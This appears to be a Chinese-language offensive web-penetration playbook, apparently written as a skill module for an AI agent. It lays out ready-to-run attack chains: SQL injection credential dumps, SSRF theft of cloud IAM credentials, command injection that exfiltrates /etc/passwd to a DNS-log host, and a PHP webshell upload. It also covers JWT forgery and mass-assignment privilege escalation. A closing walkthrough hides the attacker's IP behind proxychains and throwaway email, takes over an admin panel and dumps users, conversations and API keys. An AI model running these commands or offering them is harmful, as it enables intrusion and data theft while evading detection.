# Web 渗透模块 (Web)

> SQL注入/XSS/RCE/SSRF/SSTI/文件上传/越权/逻辑漏洞/API安全。
> 每个漏洞 = 完整攻击链 + 绕过矩阵 + 环境适配。

## 漏洞优先级

```
RCE > 文件写入 > 认证绕过 > SQL注入 > SSRF > 信息泄露 > XSS
```

## SQL 注入 — 五步完整链

### 第一步：找注入点
```sql
-- 所有入口都试：URL参数 / POST参数 / Cookie / Header / JSON
' OR '1'='1
' OR 1=1--
1' AND '1'='1
1' AND '1'='2       -- 应返回不同结果
1' AND sleep(5)--    -- 时间盲注
```

### 第二步：确认数据库
```sql
-- MySQL: "You have an error in your SQL syntax" / sleep(5)
-- MSSQL: "Unclosed quotation mark" / WAITFOR DELAY
-- Oracle: "ORA-00942" / dbms_pipe.receive_message
-- PostgreSQL: "syntax error at or near" / pg_sleep(5)
```

### 第三步：提取数据（MySQL完整链）
```sql
' ORDER BY 1--  ... ORDER BY N--                          -- 列数
' UNION SELECT 1,2,3,4,5--                                -- 联合查询
' UNION SELECT 1,database(),3,4,5--                       -- 数据库名
' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 FROM users LIMIT 0,3--  -- 只取3条！
```

### 第四步：WAF 绕过矩阵
```sql
-- 关键字绕过: UnIoN SeLeCt / un/**/ion sel/**/ect / /*!50000union*/ / UNUNIONION SELSELECTECT
-- 空格绕过: /**/  %09  %0a  %0b  括号  +
-- 引号绕过: 0x61646D696E(hex) / char(97,100,109) / %df%27(GBK宽字节)
-- 等号绕过: LIKE / REGEXP / IN(1) / BETWEEN
-- 函数绕过: mid()=substr()=substring()=left() / if()=case when
-- 入口切换: Header注入 / Cookie注入 / JSON注入 / 二次注入
```

### 第五步：sqlmap
```bash
sqlmap -u "https://{target}/page.php?id=1" --batch
sqlmap -u "..." --dbs
sqlmap -u "..." -D db -T users --dump --start 1 --stop 3  # 只取3条！
sqlmap -u "..." --tamper=space2comment,charencode
sqlmap -u "..." --technique=T --time-sec=10
```

## XSS — 上下文逃逸

```html
<!-- 测试payload -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>

<!-- 上下文逃逸 -->
<!-- HTML标签 <div>HERE</div> → <svg onload=alert(1)> -->
<!-- 属性值 <input value="HERE"> → " autofocus onfocus=alert(1) " -->
<!-- JS字符串 var x="HERE" → ";alert(1);// -->
<!-- JSON {"k":"HERE"} → '-alert(1)-' -->
<!-- href <a href="HERE"> → javascript:alert(1) -->

<!-- 绕过 -->
<ScRiPt>alert(1)</ScRiPt>                          # 大小写
&#60;script&#62;alert(1)&#60;/script&#62;              # HTML实体
eval('al'+'ert(1)')                                 # 拼接
alert`1`                                            # 模板字符串绕括号
```

## SSRF — 从Web打到云内网

```bash
# 云元数据（必打）
curl http://169.254.169.254/latest/meta-data/                    # AWS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -H "Metadata-Flavor:Google" http://metadata.google.internal/computeMetadata/v1/  # GCP
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021"  # Azure
curl http://100.100.100.200/latest/meta-data/                     # 阿里云

# 内网探测
http://127.0.0.1:8080/  /  http://10.0.0.1/  /  http://localhost:6379/  /  http://localhost:9200/

# IP绕过
http://2130706433(十进制) / http://0177.0.0.1(八进制) / http://0x7f.0x0.0x0.0x1(十六进制)
http://[::1](IPv6) / http://127.0.0.1.nip.io(DNS回环)
```

## RCE — 命令注入 + SSTI

```bash
; id    | whoami    `cat /etc/passwd`    $(whoami)    %0a id
# 空格绕过: cat${IFS}/etc/passwd   cat%09/etc/passwd   {cat,/etc/passwd}
# cat被过滤: tac/head/tail/more/strings/base64
# 无回显DNS外带: curl `whoami`.{dnslog}   ping -c 1 `cat /etc/passwd|base64`.{dnslog}
# SSTI: {{7*7}}(Jinja2)  ${7*7}(FreeMarker)  <%=7*7%>(ERB)  #{7*7}(Thymeleaf)
```

## 文件上传 — 五层防御

```
第一层: 客户端JS → 浏览器引擎绕过
第二层: 扩展名黑名单 → .php5 .phtml .phar .php. .PHP .Php
第三层: Content-Type → image/jpeg
第四层: 文件头 → GIF89a 前缀
第五层: 内容检测 → $a='ass'.'ert';$a($_POST['x']);
组合: shell.php→shell.jpg→shell.php5→shell.php%00.jpg→shell.jpg/.php→GIF89a<?php...?>
```

## 越权 (IDOR)

```bash
# 水平: GET /api/user/profile?id=1 → id=2
# 垂直: GET /api/admin/users(普通用户)
# Cookie: role=user→role=admin
# JWT: {"role":"user"}→{"role":"admin"}
```

## 浏览器引擎：Web 自动化

```
1. visit_web打开登录页 → 自动填充payload → 截图验证
2. JS源码抓取：访问页面 → 提取所有script → download_file → grep分析
3. SPA端点提取：浏览器打开SPA → 监听网络请求 → 收集API端点
4. 自动化爆破：打开登录页 → 遍历字典 → 观察响应差异
5. 截图证据：每个漏洞用浏览器截图作为报告附件
```

## 本机环境速查

```
已安装: sqlmap✅ nuclei✅ ffuf✅
缺失: burpsuite❌ → 浏览器引擎(Playwright) + curl
      sstimap❌ → 手工: {{7*7}} ${7*7} <%=7*7%> #{7*7}
      xsstrike❌ → 手工: 上下文逃逸payload
```

---

## 知识锚点（Playbook + H1 案例）

> 执行前先查阅对应 playbook，确保攻击链完整；H1 案例提供真实漏洞参考；Payload 库提供现成投递载荷。

### Playbook（攻击手册）

| 漏洞类型 | Playbook 路径 |
|----------|--------------|
| SQL注入 | `references/playbooks/sqli.md` |
| XSS | `references/playbooks/xss/00-index.md` |
| RCE/反序列化/SSTI/XXE | `references/playbooks/rce/00-index.md` |
| SSRF/缓存/Host | `references/playbooks/ssrf-cache-host/00-index.md` |
| 路径穿越 | `references/playbooks/path-traversal/00-index.md` |
| 文件上传 | `references/playbooks/file-upload/00-index.md` |
| 逻辑漏洞 | `references/playbooks/logic-flaws/00-index.md` |
| 认证(OAuth/SAML/JWT) | `references/playbooks/oauth-saml-jwt/00-index.md` |
| API安全 | `references/playbooks/api-rest/00-index.md` |
| GraphQL | `references/playbooks/graphql.md` |
| HTTP走私 | `references/playbooks/http-smuggling.md` |
| 竞态条件 | `references/playbooks/race-conditions.md` |
| DoS | `references/playbooks/dos.md` |
| LLM注入 | `references/playbooks/llm-prompt-injection/00-index.md` |
| 未授权访问 | `references/playbooks/unauth-access.md` |
| 信息泄露 | `references/playbooks/info-disclosure.md` |
| 任意X越权 | `references/playbooks/arbitrary-x-authz.md` |
| 内网后渗透 | `references/playbooks/intranet-postexp/00-index.md` |

### H1 真实案例（按弱点分类）

| 漏洞类型 | H1 案例路径 |
|----------|------------|
| SQL注入 | `references/h1-reports/by-weakness/sql-injection.md` / `blind-sql-injection.md` |
| XSS | `references/h1-reports/by-weakness/cross-site-scripting-xss.md` / `cross-site-scripting-xss-stored.md` / `cross-site-scripting-xss-reflected.md` / `cross-site-scripting-xss-dom.md` |
| SSRF | `references/h1-reports/by-weakness/server-side-request-forgery-ssrf.md` |
| 命令注入 | `references/h1-reports/by-weakness/os-command-injection.md` / `command-injection-generic.md` |
| 代码注入 | `references/h1-reports/by-weakness/code-injection.md` |
| 反序列化 | `references/h1-reports/by-weakness/deserialization-of-untrusted-data.md` |
| 路径穿越 | `references/h1-reports/by-weakness/path-traversal.md` / `relative-path-traversal.md` |
| 文件上传 | `references/h1-reports/by-weakness/unrestricted-upload-of-file-with-dangerous-type.md` |
| HTTP走私 | `references/h1-reports/by-weakness/http-request-smuggling.md` |
| 逻辑漏洞 | `references/h1-reports/by-weakness/business-logic-errors.md` |
| CSRF | `references/h1-reports/by-weakness/cross-site-request-forgery-csrf.md` |
| 越权/IDOR | `references/h1-reports/by-weakness/improper-authorization.md` / `insecure-direct-object-reference-idor.md` |
| 信息泄露 | `references/h1-reports/by-weakness/information-disclosure.md` |
| XXE | `references/h1-reports/by-weakness/xml-external-entities-xxe.md` |
| 开放重定向 | `references/h1-reports/by-weakness/open-redirect.md` |
| CRLF注入 | `references/h1-reports/by-weakness/crlf-injection.md` |
| LLM注入 | `references/h1-reports/by-weakness/llm01-prompt-injection.md` |

### Payload 库

| 用途 | Payload 路径 |
|------|-------------|
| SQL注入Payload | `payloads/web/sqli-payloads.md` |
| XSS Payload | `payloads/web/xss-payloads.md` |
| 云元数据Payload | `payloads/web/cloud-payloads.md` |
| WAF绕过 | `payloads/bypass/waf-bypass.md` |

---

## API 安全专项 (OWASP API Top 10 — api-security 能力)

> API 不同于传统 Web：无前端界面、数据格式固定、认证方式多样
> 核心：JWT 操纵 + 对象级越权 + GraphQL 注入 + 批量操作

### 底层原理：API 不渲染页面，但数据流更直接

```
传统 Web：浏览器 → HTML → 用户看 → 提交表单 → 服务器
API：      客户端 → JSON/XML → 服务器 → 数据库

API 攻击的独特优势：
- 无前端验证（直接操作数据，绕过所有客户端限制）
- 版本遗留（v1/v2/v3 同时存在，老版本没有安全修复）
- 批量操作（一发请求改100条数据 vs 传统Web一次改一条）
- 认证方式多样（JWT/OAuth/API Key/Basic Auth，每种都有坑）
```

### API 攻击决策树

```
拿到 API 端点，该测什么？
├── 认证测试
│   ├── 无认证直接访问 → 应返回 401
│   ├── 弱 API Key → 尝试枚举/爆破
│   ├── JWT 操纵 → 见下方 JWT 专项
│   └── OAuth 绕过 → redirect_uri 劫持、state 参数缺失
├── 越权测试 (BOLA/BFLA)
│   ├── 水平越权: GET /api/users/1 → /api/users/2（看别人的数据）
│   ├── 垂直越权: 普通用户访问 /api/admin/users
│   └── 批量: GET /api/users?ids=1,2,3,4,5
├── 注入测试
│   ├── SQL 注入：JSON 参数中的 SQL 注入
│   ├── NoSQL 注入：{"$gt": ""} / {"$where": "1==1"}
│   ├── 命令注入：参数传到系统命令
│   └── GraphQL 注入：内省查询 + 深度攻击
├── 速率限制
│   ├── 爆破：连续请求认证端点
│   ├── 批量操作：一次请求改 N 条数据
│   └── 资源耗尽：深度嵌套 GraphQL 查询
└── 批量赋值
    ├── 注册时添加 role=admin
    ├── 更新时添加 is_admin=true
    └── 创建时添加 credit=99999
```

### JWT 操纵（最高频的 API 漏洞）

```bash
# === 1. JWT 结构 ===
# header.payload.signature
# Base64(header).Base64(payload).HMAC/RSA(header+payload)

# === 2. 解码 JWT ===
python3 << 'EOF'
import base64, json
jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsIm5hbWUiOiJ6aGFuZ3NhbiJ9.xxx"
parts = jwt.split('.')
for i, part in enumerate(parts[:2]):  # 只解码前两部分
    # 补齐 Base64 padding
    padded = part + '=' * (4 - len(part) % 4)
    decoded = base64.urlsafe_b64decode(padded)
    print(f"Part {i}: {json.loads(decoded)}")
EOF

# === 3. 算法混淆攻击 (alg:none) ===
# 修改 header: {"alg":"none","typ":"JWT"}
# 删除 signature 部分
# 发送 → 服务器可能跳过签名验证

# === 4. RS256 → HS256 混淆 ===
# 如果服务器用 RS256(公钥/私钥)，但验证时不检查算法
# 攻击者把 alg 改成 HS256，用公钥作为 HMAC 密钥签名
# 因为公钥是公开的，所以可以伪造任何 JWT

# === 5. 弱密钥爆破 ===
# 用 john 爆破 HS256 的密钥
python3 -c "
import hmac, hashlib, base64
# 尝试常见密钥
for secret in ['secret', 'key', 'password', 'jwt_secret', 'changeme']:
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    if sig == target_signature:
        print(f'密钥: {secret}')
"

# === 6. 声明篡改 ===
# 修改 payload 中的敏感字段
# {"role":"user"} → {"role":"admin"}
# {"exp":1234567890} → {"exp":9999999999}  # 永不过期
# {"sub":"user123"} → {"sub":"admin"}
# 然后用弱密钥或 none 算法重新签名

# === 7. kid 注入 ===
# 如果 JWT header 有 kid 字段（密钥ID）
# {"alg":"HS256","kid":"/etc/passwd"}  # 路径遍历 → 用文件内容作为密钥
# {"alg":"HS256","kid":"../../dev/null"}  # 用空内容作为密钥
```

### 对象级越权 (BOLA/IDOR)

```bash
# === 1. 顺序 ID 遍历 ===
# 如果 API 使用自增 ID
for i in $(seq 1 100); do
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/users/$i" | jq '.email'
done

# === 2. UUID 枚举 ===
# 如果 API 使用 UUID，需要通过其他端点泄露 UUID
# 例如：GET /api/orders（列表）→ 泄露其他用户的订单 UUID
# 然后：GET /api/orders/{leaked-uuid} → 越权访问

# === 3. 批量越权 ===
# 如果 API 支持批量操作
curl -X GET "https://api.target.com/users?ids=1,2,3,4,5" \
  -H "Authorization: Bearer $TOKEN"
# 或者
curl -X PATCH "https://api.target.com/users" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"ids":[1,2,3],"role":"admin"}'

# === 4. 越权检测脚本 ===
python3 << 'EOF'
import requests

token = "eyJ..."
base = "https://api.target.com"

# 用你自己的 ID 获取你的数据（基线）
my_resp = requests.get(f"{base}/users/me", headers={"Authorization": f"Bearer {token}"})
my_data = my_resp.json()

# 尝试访问其他用户的 ID
for user_id in range(1, 20):
    resp = requests.get(f"{base}/users/{user_id}", headers={"Authorization": f"Bearer {token}"})
    if resp.status_code == 200 and resp.json() != my_data:
        print(f"!! BOLA: 可访问用户 {user_id} 的数据")
        print(f"   {resp.json()}")
EOF
```

### GraphQL 安全

```bash
# === 1. 内省查询（发现所有字段） ===
# 如果未禁用 introspection
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name kind } } } } }"}'

# === 2. 深度攻击 ===
# 嵌套查询可能导致 DoS
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { user { posts { comments { user { posts { comments { user { name } } } } } } } }"}'

# === 3. 批量查询绕过速率限制 ===
# 一个请求发出多个查询（别名攻击）
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { q1: user(id:1) { email } q2: user(id:2) { email } q3: user(id:3) { email } }"}'

# === 4. 字段建议（如果启用了 field suggestions） ===
# 输入错误字段名，看错误信息是否泄露真实字段名
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { passwrd } }"}'  # 故意拼错
# 响应: "Did you mean 'password'?" → 字段名泄露

# === 5. NoSQL 注入（如果后端是 MongoDB） ===
# GraphQL + MongoDB
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users(filter: {password: {\"$gt\": \"\"}}) { name password } }"}'
```

### 批量赋值 (Mass Assignment)

```bash
# === 1. 注册时添加特权字段 ===
curl -X POST https://api.target.com/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "test",
    "password": "test123",
    "email": "test@test.com",
    "role": "admin",           # 尝试添加
    "is_admin": true,          # 尝试添加
    "verified": true,          # 尝试添加
    "credit": 99999            # 尝试添加
  }'

# === 2. 更新时添加特权字段 ===
curl -X PATCH https://api.target.com/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test",
    "role": "admin",
    "is_premium": true,
    "subscription_tier": "enterprise"
  }'

# === 3. 数组参数污染 ===
# 如果后端框架不区分 ?role=user 和 ?role[]=admin
curl -X POST https://api.target.com/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"user","role":"admin"}'
```

### API 发现（找隐藏端点）

```bash
# 1. JS 源码分析（用浏览器引擎）
# 访问 SPA → 用 browser 抓取所有 JS 文件
# grep 搜索 API 路由
grep -r "api\|/v1/\|/v2/\|/graphql\|/swagger\|/openapi" js_files/

# 2. 移动应用 API 发现
# 反编译 APK → 搜索硬编码的 API 端点
jadx target.apk -d out/
grep -r "https\?://" out/sources/ | grep -oE 'https?://[^"'"'"' ]+' | sort -u

# 3. Swagger/OpenAPI 文档
# 常见路径
curl -s https://target.com/swagger.json
curl -s https://target.com/api-docs
curl -s https://target.com/openapi.json
curl -s https://target.com/v2/api-docs
curl -s https://target.com/v3/api-docs

# 4. 机器人文件
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml
```

### 速率限制测试

```bash
# 爆破认证端点
for i in $(seq 1 100); do
  curl -s -X POST https://api.target.com/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"test@test.com\",\"password\":\"pass$i\"}" \
    -w "HTTP %{http_code}" &
done
# 观察：什么时候返回 429？返回 429 后继续请求是否被拒绝？

# 绕过速率限制的方法：
# 1. 添加 X-Forwarded-For 头
# 2. 添加 X-Real-IP 头
# 3. 使用多个 API 密钥
# 4. 在请求中添加空白字符（空格/%20/%00）
# 5. 切换 API 版本（v1 → v2）
```

## 完整链路：API发现 → 注册 → 管理端入侵

> 从零开始攻破一个带 API 和 Swagger 文档的站点。
> 依赖：temp-mail 临时邮箱 + curl + 已隐藏的出口 IP

### Step 1: 发现 API 文档

```bash
# 常见 Swagger/OpenAPI 路径（逐个测试，全部走 proxychains）
proxychains curl -s http://target:8000/openapi.json
proxychains curl -s http://target:8000/docs
proxychains curl -s http://target:8000/swagger.json
proxychains curl -s http://target:8000/api-docs
proxychains curl -s http://target:8000/redoc
proxychains curl -s http://target:8000/v1/api-docs
proxychains curl -s http://target:8000/v2/api-docs
proxychains curl -s http://target:8000/v3/api-docs

# 如果找到 openapi.json，保存下来分析
proxychains curl -s http://target:8000/openapi.json | python3 -m json.tool > api_spec.json

# 从规范中提取所有端点
grep -oP '"/[a-z0-9/_-]+' api_spec.json | sort -u
```

### Step 2: 分析开放端点和认证要求

```bash
# 从 API 规范中提取：
# 1. 哪些端点不需要认证（🔓 无 security 字段）
# 2. 哪些端点需要认证但可能是管理员端点（🔒 含 admin/management 等词）
# 3. 注册/登录端点的参数结构

# 重点检查的免认证端点：
# /auth/registration-status  — 注册是否开放
# /auth/register              — 用户注册
# /auth/login / /auth/token   — 用户登录拿 Token
# /auth/forgot-password       — 忘记密码（可能泄露用户是否存在）
# /auth/send-verification-code — 发送验证码（可短信轰炸）
# /health / /livez / /readyz  — 健康检查
# /v1/chat/completions        — AI 对话（可能可匿名调用）
```

### Step 3: 创建临时邮箱 + 注册用户

```bash
# 3.1 创建临时邮箱（用 temp-mail 外部技能包）
cd /sdcard/Download/Operit/skills/temp-mail
proxychains python3 scripts/temp_mail.py --action create
# 注意：此处 scripts/temp_mail.py 属于 temp-mail 技能包，非 zhekk 内部脚本

# 输出：email + token + id，保存好

# 3.2 检查注册是否开放
proxychains curl -s http://target:8000/auth/registration-status

# 3.3 发送验证码
proxychains curl -s -X POST 'http://target:8000/auth/send-verification-code' \
  -H 'Content-Type: application/json' \
  -d '{"email":"xxx@web-library.net"}'

# 3.4 等待验证码邮件
proxychains python3 scripts/temp_mail.py --action wait \
  --address 'xxx@web-library.net' \
  --token 'eyJ...' \
  --timeout 120

# 3.5 注册用户（参数从 API 规范中提取）
# 变体 1: 标准注册（需要验证码）
proxychains curl -s -X POST 'http://target:8000/auth/register' \
  -H 'Content-Type: application/json' \
  -d '{
    "email":"xxx@web-library.net",
    "password":"Test123456!",
    "username":"testuser",
    "verification_code":"123456",
    "agree_terms":true
  }'

# 变体 2: 官方注册（可能不需要验证码）
# 如果 API 规范中有 /auth/official-register 端点
proxychains curl -s -X POST 'http://target:8000/auth/official-register' \
  -H 'Content-Type: application/json' \
  -d '{
    "email":"xxx@web-library.net",
    "password":"Test123456!",
    "username":"testuser"
  }'

# 常见字段名对照：
# 同意协议: agree_terms / accepted_terms / accept_terms / terms_accepted / agreed_to_terms
# 验证码: verification_code / code / verify_code / email_code
# 用户名: username / name / nickname
```

### Step 4: 登录拿 Token

```bash
# 尝试多种登录方式（从 API 规范中提取）
# 方式 1: OAuth2 表单（/auth/token）
proxychains curl -s -X POST 'http://target:8000/auth/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=xxx@web-library.net&password=Test123456!'

# 方式 2: JSON Body（/auth/login）
proxychains curl -s -X POST 'http://target:8000/auth/login' \
  -H 'Content-Type: application/json' \
  -d '{"email":"xxx@web-library.net","password":"Test123456!"}'

# 保存返回的 access_token
TOKEN="eyJ..."
```

### Step 5: 测试 Token 能力边界

```bash
# 5.1 查看用户信息
proxychains curl -s 'http://target:8000/auth/me' \
  -H "Authorization: Bearer $TOKEN"

# 5.2 测试管理端点（普通用户被拒是正常的，但如果返回数据就是漏洞）
proxychains curl -s 'http://target:8000/api/admin/users?limit=2' \
  -H "Authorization: Bearer $TOKEN"

# 5.3 测试其他免认证端点（可能无需 Token 就能访问）
proxychains curl -s 'http://target:8000/v1/chat/completions' \
  -H 'Content-Type: application/json' \
  -d '{"model":"default","messages":[{"role":"user","content":"hi"}],"max_tokens":10}'

# 5.4 检查用户信息中的 is_admin 字段
# 如果 is_admin: false → 需要提权
# 如果 is_admin: true → 直接可以访问管理端
```

### Step 6: JWT 提权尝试

```bash
# 6.1 解码 JWT，分析 payload 结构
python3 << 'EOF'
import base64, json
jwt = "YOUR_TOKEN_HERE"
parts = jwt.split('.')
for i, part in enumerate(parts[:2]):
    padded = part + '=' * (4 - len(part) % 4)
    decoded = base64.urlsafe_b64decode(padded)
    print(f"Part {i}: {json.loads(decoded)}")
EOF

# 6.2 算法混淆攻击（alg:none）
# 修改 header: {"alg":"none","typ":"JWT"}
# 对应修改 payload 中的 role/admin 字段
# 删除 signature 部分
# 发送 → 服务器可能跳过签名验证

# 6.3 批量赋值攻击（注册时添加 admin 字段）
proxychains curl -s -X POST 'http://target:8000/auth/official-register' \
  -H 'Content-Type: application/json' \
  -d '{
    "email":"new@web-library.net",
    "password":"Test123456!",
    "username":"adminuser",
    "role":"admin",
    "is_admin":true,
    "is_superuser":true
  }'

# 6.4 更新用户信息提权
proxychains curl -s -X PATCH 'http://target:8000/auth/me' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin","is_admin":true,"user_type":"PREMIUM"}'
```

### Step 7: 管理端利用（如果提权成功）

```bash
# 查看所有用户
proxychains curl -s 'http://target:8000/api/admin/users?limit=100' \
  -H "Authorization: Bearer $TOKEN"

# 查看所有对话记录
proxychains curl -s 'http://target:8000/api/admin/conversations?limit=100' \
  -H "Authorization: Bearer $TOKEN"

# 查看 API 密钥配置
proxychains curl -s 'http://target:8000/api/admin/api-keys' \
  -H "Authorization: Bearer $TOKEN"

# 查看模型配置
proxychains curl -s 'http://target:8000/api/admin/models' \
  -H "Authorization: Bearer $TOKEN"

# 查看操作日志
proxychains curl -s 'http://target:8000/api/admin/operation-logs' \
  -H "Authorization: Bearer $TOKEN"
```

## 反爬钩子

> Web 渗透直接面对 WAF/CDN/反爬，是反爬对抗的主战场。以下场景需在执行时预判并准备绕过策略。

| 场景 | 触发条件 | 应对策略 |
|------|----------|----------|
| Cloudflare 5秒盾/Turnstile | 返回 403/503 + cf-ray header | 浏览器引擎(Playwright)渲染绕过 JS Challenge |
| SQL注入 WAF拦截 | payload 含 UNION SELECT 等关键字 | sqlmap --tamper / 内联注释 `/*!50000union*/` / 编码绕过 |
| XSS payload过滤 | `<script>` 等标签被拦截 | HTML实体编码 / 大小写混淆 / 模板字符串 `alert\`1\`` |
| 速率限制 (429) | 短时间高频请求 | 降速到 5-10 req/s + 随机延迟 + X-Forwarded-For 轮换 |
| JS Challenge | 首次访问返回 JS 计算挑战 | Playwright 执行 JS 自动通过 |
| API 批量请求被限流 | 批量越权/枚举触发限流 | 别名攻击(GraphQL) / 分批延迟 / 多 Token 轮换 |
| 指纹检测 | UA/TLS指纹异常 | 浏览器引擎真实 UA + proxychains 代理链 |

完整对抗手册：`references/methodology/06-anti-antibot.md`